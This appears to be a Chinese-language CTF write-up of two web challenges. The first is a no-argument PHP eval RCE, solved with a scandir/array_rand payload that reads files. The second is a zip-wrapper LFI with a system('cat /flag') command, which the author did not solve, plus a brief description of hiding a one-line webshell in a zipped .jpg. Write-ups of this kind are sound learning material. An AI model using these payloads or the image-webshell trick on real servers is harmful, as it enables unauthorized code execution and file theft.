WEB

1.无参数RCE：Pupyy_rce（又名op舔狗日记）（成功）

参考文献

无参数函数RCE_无参数rce脚本-CSDN博客
一些不包含数字和字母的webshell | 离别歌 (leavesongs.com)
【Web】无字母/数字/参RCE相关例题wp-CSDN博客
[使用无参数函数进行命令执行_if (‘;’ === preg_replace(‘/^\w]+((?r)?)/‘, ‘’, -CSDN博客

<?php
highlight_file(__FILE__);
header('Content-Type: text/html; charset=utf-8');
error_reporting(0);
include(flag.php);
//当前目录下有好康的😋
if (isset($_GET['var']) && $_GET['var']) {
  $var = $_GET['var'];

  if (!preg_match("/env|var|session|header/i", $var,$match)) {
    if (';' === preg_replace('/[^\s\(\)]+?\((?R)?\)/', '', $var)){
    eval($_GET['var']);
    }
    else die("WAF!!");
  } else{
    die("PLZ DONT HCAK ME😅");
  }
}

查阅资料了解，长成

if (';' === preg_replace('/[^\s\(\)]+?\((?R)?\)/', '', $var)){

这个形状的东西叫做无参数RCE

参考文章里有很多使用无参数函数进行命令执行的操作，就不加赘述了。

参考文章里用的是

payload:?exp=show_source(array_rand(array_flip(scandir(pos(localeconv())))));

来打

观察这道题的代码，把exp改成var即可得到相同的效果，
但由于是随机返回目录下文件，所以在欣赏了出题人的长篇原神玩后感和多篇舔狗日记后，我获得了flag。

2.文件上传&一句话图片木马：famale_imp_l0ve/雌小鬼（失败）

题目描述太牛魔抽象了：

雌小鬼看了下o2takuXX师傅的马子说:”呐就..就怎么长吗，真是杂鱼呢❤”,你能来帮帮他吗？

经过一番探索发现只能上传zip文件还不会解压
扫描后发现了一些可疑的路由，访问/include.php

<?php
//o2takuXX师傅说有问题，忘看了。
header('Content-Type: text/html; charset=utf-8');
highlight_file(__FILE__);
$file = $_GET['file'];
if(isset($file) && strtolower(substr($file, -4)) == ".jpg"){
  include($file);
}
?>

尝试上传了一下，然后尝试用phar伪协议
得到payload:?file=zip://upload/1.zip%231.jpg&cmd=system(‘cat /flag’);
然后就没有然后嘞

图片木马

后来才知道还有图片木马这种东西
大概是上传一句话木马写在txt文件里，改后缀jpg，然后压缩成zip文件
